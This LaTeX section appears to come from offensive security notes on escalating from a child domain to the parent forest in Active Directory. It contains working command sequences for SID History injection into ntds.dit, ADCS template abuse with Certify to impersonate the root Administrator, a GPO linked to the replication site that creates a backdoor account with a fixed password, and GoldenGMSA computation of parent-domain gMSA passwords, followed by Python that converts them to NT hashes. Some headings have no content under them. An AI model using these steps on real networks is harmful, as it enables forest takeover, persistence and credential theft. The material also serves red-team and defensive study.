\section{Child - Parent trust Attack}

\subsubsection{Unconstrained delegation}


\subsection{SID-History Modification (T1134.005)}
\label{mitre:t1134.005}


modify SID History of an account~\url{https://www.thehacker.recipes/a-d/persistence/sid-history}

\begin{verbatim}
# Install DSInternals on the domain controller
Install-Module -Name DSInternals

# Find the account SID you want to inject
Get-ADUser -Identity $InterestingUser

# Stop the NTDS service
Stop-service NTDS -force

# Inject the SID into the SID History attribute
Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit

# Start the NTDS service
Start-service NTDS
\end{verbatim}

\subsection{Golden Ticket with ExtraSID Attack}
see~\ref{kerberos:golden-extra-sid-ticket}

\subsection{Trust ticket - forge inter-realm TGT}
See~\ref{kerberos:trust_inter_realm}



\subsection{Configuration Naming Context (NC) Replication Abuse}
exploit the replication mechanism of the Configuration Naming Context in Active Directory to propagate unauthorized changes or configurations across the domain infrastructure. By leveraging this method, attackers can potentially introduce backdoors, escalate privileges, or manipulate critical settings, thereby compromising the security and integrity of the entire Active Directory environment.

\begin{verbatim}
    $dn = "CN=Configuration,DC=<root_domain_name>,DC=<tld>"
    $acl = Get-Acl -Path "AD:\$dn"
    $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write" }
\end{verbatim}

That shows that \verb+NT AUTHORITY\SYSTEM+ has \verb+GenericAll+ on the container. So beeing \verb+NT AUTHORITY\SYSTEM+ (\verb+.\PsExec -s -i powershell+) on a DC in the forest will allow to operate modification on the whole forest.


\subsubsection{ADCS}
Create a vulnerable template from child domain (set ACL to grant \verb+GenericAll+ to compromised domain admin) and publish it to an CA, then request a certificate as an enterprise admin user (administrator of the root domain).

\begin{verbatim}
    Certify.exe request `
        /ca:<ca> /domain:<root_domain_fqdn> `
        /template:"<vuln_template_name>" `
        /altname:<root_domain_netbios>\Administrator
\end{verbatim}


By default ACL allow to create template but does not allow to publish them on a CA. But  \verb+NT AUTHORITY\SYSTEM+ has a \verb+GenericAll+ on \verb+CN=Public Key Services,CN=Services,CN=Configuration,DC=<root_domain_name>,DC=<tld>+ that does not propagate. The only action that need to be performed is to allow propagation.
\begin{verbatim}
    $dn  = "CN=Public Key Services,CN=Services,CN=Configuration,DC=<root_domain_name>,DC=<tld>"
    PS C:\Users\Administrator> $acl = Get-Acl -Path "AD:\$dn"
    PS C:\Users\Administrator> $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write" }
\end{verbatim}

\subsubsection{GPO on site}
A child DC with SYSTEM access can link GPOs to Active Directory (AD) replication sites, including those where parent DCs are located. This involves linking a malicious GPO to the default site CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=inlanefreight,DC=ad within the local replica of a child DC and the changes will then be replicated to the parent domain.
Simplification of a GPO On Site Attack:

\begin{itemize}
    \item  Create a malicious Group Policy Object (GPO) on the Child Domain Controller (DC).
    \item Query the Root Domain to identify the replication site of the Root Domain.
    \item Link the created GPO to the Default Replication Site of the Root DC as SYSTEM
    \item Upon completion of replication, confirm the presence of the created GPO within the Root DC.
\end{itemize}

\begin{verbatim}
$gpo = "Backdoor"
New-GPO $gpo
Import-Module .\PowerView_2.ps1
New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" `
    -Command C:\Windows\System32\cmd.exe `
    -CommandArguments "/c net user backdoor B@ckdoor123 /add"
Get-ADDomainController -Server inlanefreight.ad |Select ServerObjectDN
.\PsExec.exe -s -i powershell.exe
New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.inlanefreight.ad
\end{verbatim}


\subsubsection{Golden GMSA trust attack}

Read the password of a gMSA account in a parent domain. Tool \href{https://github.com/Semperis/GoldenGMSA}{GoldenGMSA tool}.

To generate password for gMSA accounts, domain controllers require a Key Distribution Services (KDS) root key. This key :
\begin{itemize}
    \item is created once
    \item is unique as it is stored in the Configuration partition and available to the entire forest \verb+CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=...+
\end{itemize}


To access these KDS root key attributes in root domain, one must possess at least one of the following rights:
\begin{itemize}
    \item Membership in the \verb+Enterprise Admins+ group in forest root domain
    \item Membership in the \verb+Domain Admins+ group in forest root domain
    \item Access to a domain controller as \verb+NT/AUTHORITY SYSTEM+  
\end{itemize}
    
    
    


{\bf Online}:
\begin{itemize}
    \item Query the parent domain  to obtain the SID of the gMSA account.
    \item Use the obtained SID of gMSA to calculate the password of the gMSA account by querying both domains
\end{itemize}

\begin{verbatim}
PsExec -s -i powershell
GoldenGMSA.exe gmsainfo --domain <parent_domain_fqdn>
GoldenGMSA.exe compute `
    --sid "<gmsa_sid>" `
    --forest <child_domain_fqdn> `
    --domain <parent_domain_fqdn>
\end{verbatim}


{\bf offline}:
\begin{itemize}
    \item Query the parent domain  to obtain the SID and \verb+msds-ManagedPasswordID+ of the gMSA account.
    \item Query the child domain to obtain the \verb+kdsinfo+ using \verb+SYSTEM+ privileges.
    \item Use the obtained attributes to calculate the password of the gMSA account in the parent domain by supplying the \verb+KDS key+ and \verb+gMSA info+ into the GoldenGMSA tool manually.
\end{itemize}

\begin{verbatim}
PsExec -s -i powershell
GoldenGMSA.exe gmsainfo --domain <parent_domain_fqdn>
GoldenGMSA.exe kdsinfo --forest <child_domain_fqdn>
GoldenGMSA.exe compute --sid "<gmsa_sid>" `
    --kdskey <kdsinfo_b64> `
    --pwdid <pasword_b64>
\end{verbatim}

convert b64 to NT hash:
\begin{verbatim}
import hashlib
import base64
 
base64_input  = "<value>"

print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())
\end{verbatim}

or with pycryptodome library:
\begin{verbatim}
from Crypto.Hash import MD4
import base64

base64_input  = "<value>"
print(MD4.new(base64.b64decode(base64_input)).hexdigest())
\end{verbatim}



\subsubsection{DNS}



\subsection{Schema change trust attack}
